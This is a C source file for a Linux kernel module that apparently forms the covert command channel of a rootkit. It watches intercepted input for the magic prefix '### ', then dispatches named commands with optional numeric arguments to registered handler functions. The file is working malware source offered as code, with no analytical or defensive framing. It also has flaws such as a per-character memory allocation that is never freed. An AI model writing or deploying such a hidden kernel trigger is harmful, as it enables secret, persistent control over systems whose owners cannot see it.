#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include "global.h"

#include "covert_communication.h"

struct list_head available_commands;
static int loaded=0;

char activate_pattern[] = "### ";
int size_of_pattern = sizeof(activate_pattern)-1;
int magic_word_pos = 0;
int last_match = -1;

// stuff for "internal command line"
char command_buffer[1024];
int command_pos = 0;
char param_buffer[1024];
int param_pos = 0;

// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_void_void)(void);
typedef void (*fun_void_int)(int);

#define INVALID          0
#define MATCH_MAGIC_WORD 1
#define MATCH_COMMAND    2
#define READ_PARAM       3

static int state = 0;

fun_void_int cur_command;

void add_command(char* n, void* c, int needs_arg){
    struct command *cmd;
    if(loaded == 0){ //when called for the first time, init the list head
        INIT_LIST_HEAD(&available_commands);
        loaded = 1;
    }
    cmd = (struct command *)kmalloc(sizeof(struct command), GFP_KERNEL);
    cmd->name = n;
    cmd->cmd = c;
    cmd->needs_argument = needs_arg;
    list_add(&cmd->list, &available_commands);
}

void clear_commands(void){
    struct command *cmd;
    struct list_head *pos;
    struct list_head *pos2;
    list_for_each_safe(pos, pos2, &available_commands){
        cmd = list_entry(pos, struct command, list);
        list_del(pos);
        kfree(cmd);
    }
}



static void match_magic_word(char c){
    if(last_match+1 == magic_word_pos){ // activate_pattern matched until last_match, now we compare with last_match + 1
        if(c == activate_pattern[magic_word_pos]) { // match further
//            OUR_DEBUG("match %c", c);
            last_match++;
            magic_word_pos++;
            if(last_match == size_of_pattern-1){
                //finished with matching magic word
                state++;
                OUR_DEBUG("Recognized magic word\n");
            }
        } else if(c == 127 || c == '\b') { // backspace (why would one want to do this is this case?)
//            OUR_DEBUG("backspace but right");
            if(magic_word_pos != 0){
                last_match--;
                magic_word_pos--;
            }
        } else { // wrong char
//            OUR_DEBUG("no match: %c, expected %c", c, activate_pattern[cur_position]);
            magic_word_pos++;
        }
    } else { // the previous chars don't match, but there might be backspaces and therefore we count the read input up and down
        if(c == 127 || c == '\b'){
//            OUR_DEBUG("backspace wrong");
            if(magic_word_pos != 0){
                magic_word_pos--;
            } else {
                state = INVALID;
            }
        } else {
//            OUR_DEBUG("wrong char: %c (as int: %d)", c, (int)c);
            magic_word_pos++;
        }
    }
}

static void match_command(char c){
    struct list_head *pos;
    struct command *cmd;
    fun_void_void exec;
    if(c == ' '){ // execute command or read param
        command_buffer[command_pos] = '\0';
        list_for_each(pos, &available_commands){
            cmd = list_entry(pos, struct command, list);
            if(strcmp(command_buffer, cmd->name) == 0){
                if(cmd->needs_argument){
                    state++;
                    cur_command = (fun_void_int) cmd->cmd;
                } else {
                    OUR_DEBUG("execute command: %s", cmd->name);
                    state = INVALID;
                    exec = (fun_void_void) cmd->cmd;
                    exec();
                }
                return;
            }
        }
        OUR_DEBUG("INVALID COMMAND: %s\n", command_buffer);
        state = INVALID;
    } else {// fill buffer
        if(c == 127 || c == '\b'){
            if(command_pos != 0){
                command_pos--;
            } else{
                state--;
            }
        } else {
            if(command_pos>1023){
                state=INVALID;
                return;
            }
            command_buffer[command_pos++] = c;
        }
    }
}

static void read_param(char c){
    char **end = kmalloc(1*sizeof(char*), GFP_KERNEL);
    unsigned long param;
    if(c== ' '){
        param_buffer[param_pos] = '\0';
        param = simple_strtoul(param_buffer, end, 10);
        OUR_DEBUG("Read param: %d .\n", (int)param);
        cur_command(param);
        OUR_DEBUG("And executed command.\n");
        state = INVALID;
    } else {// fill buffer
        if(c == 127 || c == '\b'){
            if(param_pos != 0){
                param_pos--;
            } else{
                state--;
            }
        } else {
            if(param_pos>1023){
                state=INVALID;
                return;
            } else {
                param_buffer[param_pos++] = c;
            }
        }
    }
}

static void handleChar(char c){
    if(c == '\r' || c == '\n'){ //reset on newline
        state = INVALID;
        return;
    }
    switch(state) {
    case INVALID:
        last_match = -1;
        magic_word_pos = 0;
        command_pos = 0;
        param_pos = 0;
        state++;
        //no break: reset and qimmediatelly start with matching
    case MATCH_MAGIC_WORD:
        match_magic_word(c);
        return;
    case MATCH_COMMAND:
        match_command(c);
        return;
    case READ_PARAM:
        read_param(c);
        return;
    }
}

void handle_input(char *buf, int count)
{
    int i;
    for(i = 0; i<count; i++){
        handleChar(buf[i]);
    }
}
